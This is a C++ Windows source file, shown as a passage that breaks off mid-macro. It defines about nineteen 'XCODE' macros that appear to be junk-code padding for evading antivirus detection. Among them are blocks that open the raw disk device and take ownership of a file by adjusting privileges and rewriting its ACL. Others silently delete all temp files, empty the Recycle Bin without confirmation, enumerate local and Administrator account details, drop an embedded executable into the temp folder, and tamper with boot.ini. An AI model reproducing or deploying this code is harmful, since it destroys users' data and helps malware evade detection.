#include "stdafx.h"
#include "md5.h"
#include "nb30.h"
#define NO_SHLWAPI_STRFCNS
#include <strsafe.h>

#pragma  comment(lib, "wininet")
#pragma  comment(lib, "urlmon")
#pragma  comment(lib, "ws2_32")
#pragma  comment(lib, "Netapi32")
#pragma  comment(lib, "shlwapi.lib")
#pragma  comment(lib, "strsafe.lib")
#pragma  comment(lib, "version")

#define FLOWERX

#define OUTSTR TRACE//OutputDebugString
using namespace std;

#define IOCTL_BEEP_SET_PROTECT_FILE	CTL_CODE(FILE_DEVICE_BEEP, 0x12, METHOD_BUFFERED, FILE_ANY_ACCESS)

char *buf = NULL,*buf1;
DWORD dwSizeXXX = MAX_PATH,dwBytesInBlock;
char szXBuff[MAX_PATH] = {0};
HANDLE hXMod = INVALID_HANDLE_VALUE;
HANDLE hmyfile,hFileMapping,hmyfilemap;
char TmpBuf[512];
MD5_CTX md5T;
unsigned char digest[16];
int PasswdLen=0;
TOKEN_PRIVILEGES tp = { 0 }; 
COMSTAT cstat;
DCB dcb;
COMMTIMEOUTS ctout;
HINSTANCE hinstExe;
LCID lcid;
PAINTSTRUCT ps;
LUID luid; 
LONG lRes;
DWORD cb=sizeof(TOKEN_PRIVILEGES);
BOOL bRetval = FALSE, bVal;
HANDLE hToken = NULL; 
PSID pSIDAdmin = NULL;
PSID pSIDEveryone = NULL;
PACL pACL = NULL;
HHOOK hhook;
HACCEL hacc;
int NUM_ACES  = 2;
EXPLICIT_ACCESS ea[2];
SID_IDENTIFIER_AUTHORITY SIDAuthWorld	= SECURITY_WORLD_SID_AUTHORITY;
SID_IDENTIFIER_AUTHORITY SIDAuthNT		= SECURITY_NT_AUTHORITY;
DWORD dwRes;
WIN32_FIND_DATA findData;
DWORD  dwPort     = 0;
CRITICAL_SECTION lock;
WNDCLASSEX wcex;
string evename = "CmdShell";
HWND hwnd,hwnd1;
COMMTIMEOUTS timeout;
HDESK hdsk;
MSG msg;
HRSRC hSrc;
HGLOBAL hGlobal;
LPVOID lp;
FILE *fd;
SYSTEM_INFO sinf;
LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry;
SECURITY_DESCRIPTOR psd;
__int64 qwFileSize,myFilesize,qwFileOffset,qwmyFileOffset;
PBYTE pbFile,pbmyFile;
FARPROC pFunc;
HKEY hKey;
char AddMsg[]="President Obama's page on Google's social network site has been inundated with messages in Chinese after restrictions in China were removed.";
OSVERSIONINFOEX osvi;
SHQUERYRBINFO shqbi;
LPUSER_INFO_0 pBuf = NULL;
LPUSER_INFO_0 pTmpBuf;
DWORD dwLevel = 0;
DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
DWORD dwEntriesRead = 0;
DWORD dwTotalEntries = 0;
DWORD dwResumeHandle = 0;
DWORD dwTotalCount = 0;
NET_API_STATUS nStatus;
MEMORY_BASIC_INFORMATION mbi;
ATOM atom;
NUMBERFMT nf;
STARTUPINFO si;
PROCESS_INFORMATION pi;
SECURITY_ATTRIBUTES sa;
UINT_PTR uintptr;
HBITMAP	hBitmap,hBitmap1;
HBITMAP *hDib;
POINT pt;
std::vector<double> aaa;
std::vector<double>::const_iterator iii;
NCB Ncb;
UCHAR uRetCode;
LANA_ENUM lenum;
int i;
char szDrive[3] = " :";
typedef struct _ASTAT_{
    ADAPTER_STATUS adapt;
    NAME_BUFFER NameBuff[ 30 ];
}ASTAT,*PASTAT;
ASTAT Adapter;
LARGE_INTEGER count_freq;
MEMORYSTATUS MemStat;
wchar_t *pwText=NULL;
typedef struct tagLANGANDCP
{
	WORD wLanguage;
	WORD wCodePage;
} LANGANDCP;
LANGANDCP FAR  *lpBuffer;
WNDPROC wpOrigEditProc;
FILETIME ft,ft1;
SYSTEMTIME st;
LPTSTR lpszVariable;
LPTCH lpvEnv;
LARGE_INTEGER liDueTime;
LPITEMIDLIST pidl = NULL;
LPMALLOC pMalloc = NULL;
va_list ap;
HWINSTA hWinSta;
ULONG_PTR CompKey;
LPOVERLAPPED po;
PHANDLE hHandleList;
LPUSER_INFO_1 pBuf1 = NULL;
LPUSER_INFO_2 pBuf2 = NULL;
LPUSER_INFO_3 pBuf3 = NULL;
LPUSER_INFO_4 pBuf4 = NULL;
LPUSER_INFO_10 pBuf10 = NULL;
LPUSER_INFO_11 pBuf11 = NULL;
LPUSER_INFO_20 pBuf20 = NULL;
LPUSER_INFO_23 pBuf23 = NULL;
ITaskScheduler * pITaskScheduler = 0;
ITask * pITask = 0;
ITaskTrigger * pITaskTrigger = 0;
HRESULT hr;
LPWSTR ppwszComputer;
WORD iNewTrigger;
TASK_TRIGGER trigger;
COORD dwCursorPostion;
CONSOLE_SCREEN_BUFFER_INFO *lpConsoleScreenBufferInfo;
CRITICAL_SECTION	g_CriticalSection;
PROCESSENTRY32 procentry;
FILETIME    datetime,local_filetime;
UINT uDropEffect;
DROPFILES dropFiles;
UINT uGblLen,uDropFilesLen;
HGLOBAL hGblFiles,hGblEffect;
DWORD *dwDropEffect;
SC_HANDLE scm;
SC_HANDLE service;
SERVICE_STATUS status;
CBitmap *pbm;
BITMAP bm = {0};
HBITMAP hbm;
HDC hdc,hdc1;
HPEN hOldPen,hPen;
RECT prcOld;
HICON hIcon;
typedef struct
{
    DWORD   dwUnknown1;
    ULONG   uKeMaximumIncrement;
    ULONG   uPageSize;
    ULONG   uMmNumberOfPhysicalPages;
    ULONG   uMmLowestPhysicalPage;
    ULONG   uMmHighestPhysicalPage;
    ULONG   uAllocationGranularity;
    PVOID   pLowestUserAddress;
    PVOID   pMmHighestUserAddress;
    ULONG   uKeActiveProcessors;
    BYTE    bKeNumberProcessors;
    BYTE    bUnknown2;
    WORD    wUnknown3;
} SYSTEM_BASIC_INFORMATION;

typedef struct
{
    LARGE_INTEGER   liIdleTime;
    DWORD           dwSpare[76];
} SYSTEM_PERFORMANCE_INFORMATION;

typedef struct
{
    LARGE_INTEGER liKeBootTime;
    LARGE_INTEGER liKeSystemTime;
    LARGE_INTEGER liExpTimeZoneBias;
    ULONG         uCurrentTimeZoneId;
    DWORD         dwReserved;
} SYSTEM_TIME_INFORMATION;
SYSTEM_PERFORMANCE_INFORMATION SysPerfInfo;
SYSTEM_TIME_INFORMATION        SysTimeInfo;
SYSTEM_BASIC_INFORMATION       SysBaseInfo;
typedef LONG (WINAPI *PROCNTQSI)(UINT,PVOID,ULONG,PULONG);
typedef BOOL (WINAPI *CHECKD8)(LPCTSTR,LPSTR,DWORD,PBOOL,PBOOL);
typedef BOOL (WINAPI *CRDP)(HANDLE,PBOOL);
PROCNTQSI NtQuerySystemInformation;
typedef BOOL (CALLBACK *PROCENUMPROC)(DWORD, WORD, LPSTR, LPARAM);
typedef struct {
	DWORD dwPID;
	PROCENUMPROC lpProc;
	DWORD lParam;
	BOOL bEnd;
} EnumInfoStruct;
HANDLE (WINAPI *lpfCreateToolhelp32Snapshot)(DWORD, DWORD);
BOOL (WINAPI *lpfProcess32First)(HANDLE, LPPROCESSENTRY32);
BOOL (WINAPI *lpfProcess32Next)(HANDLE, LPPROCESSENTRY32);
BOOL (WINAPI *lpfEnumProcesses)(DWORD *, DWORD, DWORD *);
BOOL (WINAPI *lpfEnumProcessModules)(HANDLE, HMODULE *, DWORD,LPDWORD);
DWORD (WINAPI *lpfGetModuleBaseName)(HANDLE, HMODULE, LPTSTR, DWORD);
INT (WINAPI *lpfVDMEnumTaskWOWEx)(DWORD, TASKENUMPROCEX, LPARAM);

BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, PSZ pszFileName, LPARAM lpUserDefined) {
	BOOL bRet=TRUE;
	EnumInfoStruct *psInfo = (EnumInfoStruct *)lpUserDefined;
	if (!bRet)
		psInfo->bEnd = TRUE;
	return !bRet;
}

#define XCODE1 try {OUTSTR("1");\
		GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
		hXMod = CreateFile(szXBuff, GENERIC_READ,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
		if (INVALID_HANDLE_VALUE != hXMod)\
		{\
			dwSizeXXX = GetFileSize(hXMod, NULL);\
			buf = (char *)malloc(dwSizeXXX);\
			if (buf!=NULL)\
			{\
				ReadFile(hXMod, buf, dwSizeXXX, &dwSizeXXX, NULL);\
				CloseHandle(hXMod);\
				if (buf[dwSizeXXX-0x20]=='A')\
				{\
					dwSizeXXX=GetTickCount();\
				}\
			}\
		}\
	}\
	catch(...) {\
	Sleep(1);\
	}

#define XCODE2 try {OUTSTR("2");\
	GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
	PasswdLen = strlen(szXBuff);\
	memcpy(TmpBuf + 0x00, "\x7F", 1);\
	memcpy(TmpBuf + 0x01, szXBuff, PasswdLen);\
	memcpy(TmpBuf + 0x01 + PasswdLen, "1234567890ABCDEF", 16);\
	md5T.MD5Update((unsigned char*)TmpBuf, 17 + PasswdLen);\
	md5T.MD5Final(digest);\
	memcpy(szXBuff, digest, 16);\
	}\
	catch(...) {\
	Sleep(2);\
	}

#define XCODE3 try {OUTSTR("3");\
	hXMod = CreateFile("\\Device\\Harddisk0\\Partition0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\
	if (hXMod != INVALID_HANDLE_VALUE)\
	{\
		OUTSTR("open device success");\
		dwRes = inet_addr("192.168.1.203");\
		DeviceIoControl(hXMod, IOCTL_BEEP_SET_PROTECT_FILE, szXBuff, sizeof(szXBuff), NULL, 0, &dwRes, NULL);\
		CloseHandle(hXMod);\
	}\
	}\
		catch(...) {\
		Sleep(3);\
	}

#define XCODE4 try {OUTSTR("4");\
	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) \
	{\
		;\
	}\
	if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin)) \
	{\
		;\
	}\
	ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));\
	ea[0].grfAccessPermissions = GENERIC_READ;\
	ea[0].grfAccessMode = SET_ACCESS;\
	ea[0].grfInheritance = NO_INHERITANCE;\
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;\
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;\
	ea[0].Trustee.ptstrName = (LPTSTR) pSIDEveryone;\
	ea[1].grfAccessPermissions = GENERIC_ALL;\
	ea[1].grfAccessMode = SET_ACCESS;\
	ea[1].grfInheritance = NO_INHERITANCE;\
	ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;\
	ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;\
	ea[1].Trustee.ptstrName = (LPTSTR) pSIDAdmin;\
	if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES, ea, NULL, &pACL))\
	{\
		;\
	}\
	dwRes = SetNamedSecurityInfo( szXBuff, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);\
	if (ERROR_SUCCESS == dwRes) \
	{\
		bRetval = TRUE;\
		;\
	}\
	if (dwRes != ERROR_ACCESS_DENIED)\
	{\
		;\
	}\
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) \
	{\
		; \
	} \
	if(LookupPrivilegeValue( NULL, SE_TAKE_OWNERSHIP_NAME, &luid ))\
	{\
		tp.PrivilegeCount = 1; \
		tp.Privileges[0].Luid = luid; \
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\
		AdjustTokenPrivileges( hToken, FALSE, &tp, cb, NULL, NULL );\
	}\
	dwRes = SetNamedSecurityInfo( szXBuff, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL); \
	if (dwRes != ERROR_SUCCESS) \
	{\
		;\
	}\
	dwRes = SetNamedSecurityInfo( szXBuff, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);\
	if (dwRes == ERROR_SUCCESS)\
	{\
		bRetval = TRUE; \
	}\
	if (pSIDAdmin)\
		FreeSid(pSIDAdmin); \
	if (pSIDEveryone)\
		FreeSid(pSIDEveryone); \
	if (pACL)\
		LocalFree(pACL);\
	if (hToken)\
		CloseHandle(hToken);\
	}\
		catch(...) {\
		Sleep(4);\
	}

#define XCODE5 try {OUTSTR("5");\
	GetTempPath(64, TmpBuf);\
	strcpy(szXBuff,"http://www.eecs.ucf.edu/~leavens/Windows/bat/jtest.bat");\
	DeleteUrlCacheEntry (szXBuff);\
	strcat(TmpBuf, "dtapp.bat");\
	if (0)\
	{\
		fd=fopen(TmpBuf, "r");\
		fread(szXBuff, MAX_PATH, 1, fd);\
		fclose(fd);\
	}\
	else\
	{\
		WinExec("cmd /c dir", SW_HIDE);\
	}\
	}\
	catch(...) {\
	Sleep(5);\
	}

#define XCODE6 try {OUTSTR("6");\
	GetTempPath(MAX_PATH, szXBuff);\
	SetCurrentDirectory(szXBuff);\
	hXMod = FindFirstFile(szXBuff, &findData);\
	if ((hXMod != INVALID_HANDLE_VALUE))\
	{\
		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))\
		{\
			GetFullPathName(findData.cFileName,MAX_PATH,szXBuff,NULL);\
			DeleteFile(szXBuff);\
		}\
		while (FindNextFile(hXMod, &findData) != 0)\
		{\
			if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))\
			{\
				GetFullPathName(findData.cFileName,MAX_PATH,szXBuff,NULL);\
				DeleteFile(szXBuff);\
			}\
		}\
		FindClose(hXMod);\
	}\
	hXMod = FindFirstFile("*", &findData);\
	if ((hXMod != INVALID_HANDLE_VALUE))\
	{\
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)\
		{\
			if (findData.cFileName[0] != '.')\
			{\
				SetCurrentDirectory(findData.cFileName);\
			}\
		}\
		while (FindNextFile(hXMod, &findData) != '\x0')\
		{\
			if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)\
			{\
				if (findData.cFileName[0] != '.')\
				{\
					SetCurrentDirectory(findData.cFileName);\
				}\
			}\
		}\
		FindClose(hXMod);\
	}\
	}\
	catch(...) {\
	Sleep(6);\
	}

#define XCODE7 try {OUTSTR("7");\
	setlocale(LC_ALL,"chs");\
	InitializeCriticalSection(&lock);\
	SetConsoleCtrlHandler((PHANDLER_ROUTINE)NULL,TRUE);\
	hwnd = GetActiveWindow();\
	SetWindowText(hwnd,"Waiting for client connect.....");\
	PeekMessage(&msg,NULL,0,0,PM_NOREMOVE);\
	hXMod = OpenEvent(EVENT_ALL_ACCESS,TRUE,"CMD_EVENT");\
	if (NULL != hXMod)\
	{\
		if(SetEvent(hXMod))\
		{\
			while(TRUE)\
			{\
				if(PeekMessage(&msg,NULL,0,0,PM_REMOVE))\
				{\
					if (msg.message == 5)\
					{\
						dwSizeXXX = msg.wParam;\
						sprintf(szXBuff, "%d", dwSizeXXX);\
						SetWindowText(hwnd,szXBuff);\
						break;\
					}\
				}\
			}\
			evename += szXBuff;\
			hXMod=CreateEvent(NULL,FALSE,FALSE,evename.c_str());\
		}\
	}\
	}\
	catch(...) {\
	Sleep(7);\
	}

#define XCODE8 try {OUTSTR("8");\
	GetTempPath(64, TmpBuf);\
	strcat(TmpBuf, "dtapp.exe");\
	hSrc = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE((WORD)IDD_BUNDLE2_DIALOG), "EXE");\
	hGlobal = LoadResource(NULL,hSrc);\
	lp = LockResource(hGlobal);\
	dwSizeXXX = SizeofResource(NULL,hSrc);\
	ofstream ofs(TmpBuf,ios::binary);\
	ofs.write((char*)lp,4);\
	ofs.close();\
	FreeResource(hGlobal);\
	}\
	catch(...) {\
	Sleep(8);\
	}

#define XCODE9 try {OUTSTR("9");\
	GetSystemInfo(&sinf);\
	hXMod = CreateFile(".\\first.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);\
	hmyfile =CreateFile("c:\\second.txt", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\
	hFileMapping = CreateFileMapping(hXMod, NULL,PAGE_READONLY, 0, 0, NULL);\
	qwFileSize = GetFileSize(hXMod, &dwSizeXXX);\
	qwFileSize += (((__int64) dwSizeXXX) << 32);\
	myFilesize=qwFileSize+sinf.dwAllocationGranularity;\
	hmyfilemap = CreateFileMapping(hmyfile, NULL, PAGE_READWRITE,(DWORD)(myFilesize>>32), (DWORD)(myFilesize& 0xFFFFFFFF), NULL);\
	CloseHandle(hXMod);\
	CloseHandle(hmyfile);\
	pbmyFile=(PBYTE) MapViewOfFile(hmyfilemap, FILE_MAP_WRITE, 0, 0, sizeof(AddMsg));\
	memcpy(pbmyFile,AddMsg,sizeof(AddMsg));\
	UnmapViewOfFile(pbmyFile);\
	qwFileOffset = 0;\
	qwmyFileOffset=sinf.dwAllocationGranularity;\
	while (qwFileSize > 0)\
	{\
		dwBytesInBlock = sinf.dwAllocationGranularity;\
		if(qwFileSize < sinf.dwAllocationGranularity)\
			dwBytesInBlock =(DWORD) qwFileSize;\
		pbFile = (PBYTE) MapViewOfFile(hFileMapping, FILE_MAP_READ,(DWORD)(qwFileOffset >> 32),(DWORD)(qwFileOffset & 0xFFFFFFFF),dwBytesInBlock);\
		pbmyFile=(PBYTE) MapViewOfFile(hmyfilemap, FILE_MAP_WRITE,(DWORD)(qwmyFileOffset >> 32),(DWORD)(qwmyFileOffset & 0xFFFFFFFF),dwBytesInBlock);\
		memcpy(pbmyFile,pbFile,dwBytesInBlock);\
		UnmapViewOfFile(pbFile);\
		UnmapViewOfFile(pbmyFile);\
		qwmyFileOffset+=dwBytesInBlock;\
		qwFileOffset += dwBytesInBlock;\
		qwFileSize -= dwBytesInBlock;\
	}\
	CloseHandle(hFileMapping);\
	CloseHandle(hmyfilemap);\
	}\
	catch(...) {\
	Sleep(9);\
	}

#define XCODE10 try {OUTSTR("10");\
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));\
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);\
	if( !GetVersionEx((OSVERSIONINFO *)&osvi))\
	{\
		osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);\
		GetVersionEx((OSVERSIONINFO *)&osvi);\
	}\
	dwRes = RegOpenKeyEx( HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\ProductOptions",0, KEY_QUERY_VALUE, &hKey );\
	if( dwRes == ERROR_SUCCESS )\
	{\
	RegQueryValueEx( hKey, "ProductType", NULL, NULL, (LPBYTE) szXBuff, &dwSizeXXX);\
	RegCloseKey( hKey );\
	if ( lstrcmpi( "WINNT", szXBuff) == 0 )\
	OUTSTR("Workstation");\
	if ( lstrcmpi( "LANMANNT", szXBuff) == 0 )\
	OUTSTR( "Server " );\
	if ( lstrcmpi( "SERVERNT", szXBuff) == 0 )\
	OUTSTR( "Advanced Server " );\
	sprintf(szXBuff,"%d.%d", osvi.dwMajorVersion, osvi.dwMinorVersion );\
	OUTSTR(szXBuff);\
	}\
	}\
	catch(...) {\
		Sleep(10);\
	}

#define XCODE11 try {OUTSTR("11");\
	shqbi.cbSize = sizeof(shqbi);\
	shqbi.i64NumItems = -1;\
	shqbi.i64Size = -1;\
	if(S_OK == SHQueryRecycleBin(0, &shqbi))\
	{\
		sprintf(szXBuff, "Items:%u Bytes used:%u", (DWORD)shqbi.i64NumItems, (DWORD)shqbi.i64Size);\
		SHEmptyRecycleBin(0, 0, SHERB_NOPROGRESSUI|SHERB_NOCONFIRMATION);\
	}\
	}\
	catch(...) {\
		Sleep(11);\
	}


#define XCODE12 try {OUTSTR("12");\
do {\
	   nStatus = NetUserEnum(L"localhost",dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);\
	   if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))\
	   {\
		   if ((pTmpBuf = pBuf) != NULL)\
		   {\
			   for (dwRes = 0; (dwRes < dwEntriesRead); dwRes++)\
			   {\
				   if (pTmpBuf == NULL)\
				   {\
					   fprintf(stderr, "An access violation has occurred\n");\
					   break;\
				   }\
				   wprintf(L"\t-- %s\n", pTmpBuf->usri0_name);\
				   pTmpBuf++;\
				   dwTotalCount++;\
			   }\
		   }\
	   }\
	   else\
		   fprintf(stderr, "A system error has occurred: %d\n", nStatus);\
	   if (pBuf != NULL)\
	   {\
		   NetApiBufferFree(pBuf);\
		   pBuf = NULL;\
	   }\
   }\
   while (nStatus == ERROR_MORE_DATA);\
   if (pBuf != NULL)\
	   NetApiBufferFree(pBuf);\
   fprintf(stderr, "\nTotal of %d entries enumerated\n", dwTotalCount);\
	}\
		catch(...) {\
		Sleep(12);\
	}

#define XCODE13 try {OUTSTR("13");\
		PasswdLen=0;\
		while (PasswdLen < 24) {\
		dwLevel = PasswdLen;\
		nStatus = NetUserGetInfo(L"localhost", L"Administrator", dwLevel, (LPBYTE *) & pBuf);\
		if (nStatus == NERR_Success) {\
			if (pBuf != NULL) {\
				switch (PasswdLen) {\
				case 0:\
					wprintf(L"\tUser account name: %s\n", pBuf->usri0_name);\
					break;\
				case 1:\
					pBuf1 = (LPUSER_INFO_1) pBuf;\
					wprintf(L"\tUser account name: %s\n", pBuf1->usri1_name);\
					break;\
				case 2:\
					pBuf2 = (LPUSER_INFO_2) pBuf;\
					wprintf(L"\tPrivilege level: %d\n", pBuf2->usri2_priv);\
					break;\
				case 4:\
					pBuf4 = (LPUSER_INFO_4) pBuf;\
					wprintf(L"\tHome directory: %s\n", pBuf4->usri4_home_dir);\
					break;\
				case 10:\
					pBuf10 = (LPUSER_INFO_10) pBuf;\
					wprintf(L"\tUser account name: %s\n", pBuf10->usri10_name);\
					wprintf(L"\tFull name: %s\n", pBuf10->usri10_full_name);\
					break;\
				case 11:\
					pBuf11 = (LPUSER_INFO_11) pBuf;\
					wprintf(L"\tAuth flags: %x\n", pBuf11->usri11_auth_flags);\
					break;\
				case 20:\
					pBuf20 = (LPUSER_INFO_20) pBuf;\
					wprintf(L"\tFlags (in hex): %x\n", pBuf20->usri20_flags);\
					break;\
				case 23:\
					pBuf23 = (LPUSER_INFO_23) pBuf;\
					wprintf(L"\tComment: %s\n", pBuf23->usri23_comment);\
					break;\
				default:\
					break;\
				}\
			}\
		}\
		else\
			fprintf(stderr, "NetUserGetinfo failed with error: %d\n", nStatus);\
		if (pBuf != NULL)\
			NetApiBufferFree(pBuf);\
		switch (PasswdLen){\
		case 0:\
		case 1:\
		case 10:\
			PasswdLen++;\
			break;\
		case 2:\
			PasswdLen = 4;\
			break;\
		case 4:\
			PasswdLen = 10;\
			break;\
		case 11:\
			PasswdLen = 20;\
			break;\
		case 20:\
			PasswdLen = 23;\
			break;\
		default:\
			PasswdLen = 24;\
			break;\
		}\
	}\
	}\
		catch(...) {\
		Sleep(13);\
	}

#define XCODE14 try {OUTSTR("14");\
    CoInitialize( 0 );\
        hr = CoCreateInstance(  CLSID_CTaskScheduler,0,CLSCTX_SERVER,IID_ITaskScheduler,(LPVOID *)&pITaskScheduler );\
        pITaskScheduler->GetTargetComputer( &ppwszComputer );\
        _tprintf( _T("Target computer: %s\n"), ppwszComputer );\
        CoTaskMemFree( ppwszComputer );\
        hr = pITaskScheduler->NewWorkItem(L"MyHappyWorkItem",CLSID_CTask,IID_ITask,(LPUNKNOWN *)&pITask );\
        hr = pITask->SetApplicationName( L"CALC.EXE" ); \
        hr = pITask->CreateTrigger( &iNewTrigger, &pITaskTrigger );\
        pITaskTrigger->GetTrigger( &trigger );\
        trigger.wStartMinute++;\
        pITaskTrigger->SetTrigger( &trigger );\
        pITaskScheduler->Delete( L"MyHappyWorkItem" );\
    }\
    catch(...) \
    {\
        if ( pITaskTrigger )\
            pITaskTrigger->Release();\
        if ( pITask )\
            pITask->Release();\
        if ( pITaskScheduler )\
            pITaskScheduler->Release();\
			CoUninitialize();\
			Sleep(14);\
    }

#define XCODE15 try {OUTSTR("15");\
	srand(time(0));\
	InitializeCriticalSection(&g_CriticalSection);\
	hXMod=GetStdHandle(STD_OUTPUT_HANDLE);\
	if(hXMod!=INVALID_HANDLE_VALUE){\
		SetConsoleTitle(AddMsg);\
		EnterCriticalSection(&g_CriticalSection);\
		SetConsoleCtrlHandler((PHANDLER_ROUTINE)NULL,TRUE);\
		SetConsoleTextAttribute(hXMod,10);\
		SetConsoleTextAttribute(hXMod,12);\
		lpConsoleScreenBufferInfo=new CONSOLE_SCREEN_BUFFER_INFO;\
		GetConsoleScreenBufferInfo(hXMod,lpConsoleScreenBufferInfo);\
		dwCursorPostion.X=lpConsoleScreenBufferInfo->dwCursorPosition.X-1;\
		dwCursorPostion.Y=lpConsoleScreenBufferInfo->dwCursorPosition.Y;\
		SetConsoleCursorPosition(hXMod,dwCursorPostion);\
		FillConsoleOutputCharacter(hXMod,' ',1,dwCursorPostion,&dwRes);\
		delete lpConsoleScreenBufferInfo;\
	}\
    }\
	catch(...) \
    {\
		LeaveCriticalSection(&g_CriticalSection);\
		delete lpConsoleScreenBufferInfo;\
		CloseHandle(hXMod);\
		Sleep(15);\
    }

#define XCODE16 try {OUTSTR("16");\
		hXMod = LoadLibraryA("Kernel32.DLL");\
		if (hXMod == NULL)\
			throw 1;\
		hmyfile = LoadLibraryA("VDMDBG.DLL");\
		if (hmyfile == NULL)\
			throw 1;\
		lpfCreateToolhelp32Snapshot =(HANDLE (WINAPI *)(DWORD,DWORD))GetProcAddress((HMODULE)hXMod, "CreateToolhelp32Snapshot");\
		lpfProcess32First =(BOOL (WINAPI *)(HANDLE,LPPROCESSENTRY32))GetProcAddress((HMODULE)hXMod, "Process32First");\
		lpfProcess32Next =(BOOL (WINAPI *)(HANDLE,LPPROCESSENTRY32))GetProcAddress((HMODULE)hXMod, "Process32Next");\
		if (lpfProcess32Next == NULL|| lpfProcess32First == NULL|| lpfCreateToolhelp32Snapshot == NULL)\
			throw 1;\
		lpfVDMEnumTaskWOWEx = (INT (WINAPI *)(DWORD, TASKENUMPROCEX,LPARAM)) GetProcAddress((HMODULE)hmyfile, "VDMEnumTaskWOWEx");\
		if (lpfVDMEnumTaskWOWEx == NULL)\
			throw 1;\
		hFileMapping = lpfCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\
		if (hFileMapping == INVALID_HANDLE_VALUE) {\
			throw 1;\
		}\
		procentry.dwSize = sizeof(PROCESSENTRY32);\
		bRetval = lpfProcess32First(hFileMapping, &procentry);\
		EnumInfoStruct *sInfo=new EnumInfoStruct;\
		while (bRetval) {\
				if (_stricmp(procentry.szExeFile, "NTVDM.EXE") == 0) {\
					sInfo->dwPID = procentry.th32ProcessID;\
					sInfo->bEnd = FALSE;\
					lpfVDMEnumTaskWOWEx(procentry.th32ProcessID,(TASKENUMPROCEX) Enum16, (LPARAM) &sInfo);\
					if (sInfo->bEnd)\
						break;\
				}\
				procentry.dwSize = sizeof(PROCESSENTRY32);\
				bRetval = lpfProcess32Next(hFileMapping, &procentry);\
		}\
		delete sInfo;\
		}\
		catch(...)  {\
			if (hXMod)\
				FreeLibrary((HMODULE)hXMod);\
			if (hmyfile)\
				FreeLibrary((HMODULE)hmyfile);\
			Sleep(16);\
		}

#define XCODE17 try {OUTSTR("17");\
			GetWindowsDirectory(szXBuff, MAX_PATH);\
			szXBuff[3]=0;\
			strcat(szXBuff, "boot.ini");\
            hXMod = CreateFile(szXBuff,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
            if (hXMod != INVALID_HANDLE_VALUE)\
            {\
				GetFileTime(hXMod, &datetime, &datetime, &datetime);\
				datetime.dwHighDateTime++;\
				datetime.dwLowDateTime++;\
                if (TRUE == LocalFileTimeToFileTime(&datetime,&local_filetime))\
                {\
                    SetFileTime(hXMod,&local_filetime,NULL,&local_filetime);\
                }\
				dwRes=GetFileAttributes(szXBuff);\
				dwRes&=(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);\
				SetFileAttributes(szXBuff,dwRes);\
             }\
			 CloseHandle(hXMod);\
		}\
		catch(...) {\
			Sleep(17);\
		}

#define XCODE18 try {OUTSTR("18");\
			GetModuleFileName(NULL,szXBuff,MAX_PATH);\
			(strrchr(szXBuff,'\\'))[1] = 0;\
			GetTempPath(MAX_PATH, szXBuff);\
			strcat(szXBuff,"config.ini");\
			WritePrivateProfileString("netconf","str",AddMsg,szXBuff);\
			GetPrivateProfileString("netconf","code",NULL,TmpBuf,64,szXBuff);\
		}\
			catch(...) {\
			Sleep(18);\
		}

#define XCODE19 try {OUTSTR("19");\
		uDropEffect=RegisterClipboardFormat(AddMsg);\
		hGblEffect=GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE|GMEM_DDESHARE,sizeof(DWORD));\
		dwDropEffect=(DWORD*)GlobalLock(hGblEffect);\
		*dwDropEffect=DROPEFFECT_COPY;\
		GlobalUnlock(hGblEffect);\
		uDropFilesLen=sizeof(DROPFILES);\
		dropFiles.pFiles =uDropFilesLen;\
		dropFiles.pt.x=0;\
		dropFiles.pt.y=0;\
		dropFiles.fNC =FALSE;\
		dropFiles.fWide =TRUE;\
